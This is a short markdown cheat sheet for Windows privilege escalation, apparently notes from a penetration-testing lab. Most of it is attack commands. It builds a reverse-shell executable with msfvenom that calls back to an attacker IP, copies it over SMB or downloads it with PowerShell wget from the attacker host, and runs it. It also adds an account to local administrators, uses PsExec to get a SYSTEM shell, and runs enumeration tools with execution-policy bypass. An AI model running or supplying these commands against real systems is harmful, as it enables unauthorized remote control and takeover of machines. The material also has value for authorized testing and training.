# Windows Privilege Escalation

## Reverse Shell

### Creating a Reverse Shell Executable (.exe)
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.47.80 LPORT=8133 -f exe -o reverse.exe
```
### Transfering Shell
- Through SMB
kali terminal 1
```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
```
kali terminal 2
```bash
sudo nc -nvlp 8133
```
windows
```
copy \\10.13.47.80\kali\reverse.exe C:\PrivEsc\reverse.exe

C:\PrivEsc\reverse.exe
```

- Through Powershell wget
kali terminal 1
```bash
python -m SimpleHTTPServer 4444
```
kali terminal 2
```
sudo nc -nvlp 8133
```
windows
```
powershell -c wget "http://10.13.47.80:4444/reverse.exe" -outfile "C:\PrivEsc\reverse.exe"

C:\PrivEsc\reverse.exe
```

### Administrator Shell Through RDP
windows
```
net localgroup administrators <username> /add
```

### Local Admin to SYSTEM
Use PsExec64.exe
```
./PsExec64.exe -accepteula -i -s C:/PrivEsc/reverse.exe
```

## Enumeration Tools
- PowerUp.ps1
```bash
powershell -exec bypass

. .\PowerUp.ps1
Invoke-AllChecks
```

- SharpUp.exe
```
.\SharpUp.exe
```
- Seatbelt (alot outputs, does not search for privesc vectors for you)
```
.\Seatbelt.exe all
```
- WINpeas.exe (most powerful)
allow colors (Alternatively, reverse shell from kali should show colour as well)
```
reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
```
open new cmd
```
.\winPEAS.exe
```

.\winPEAS.exe
```
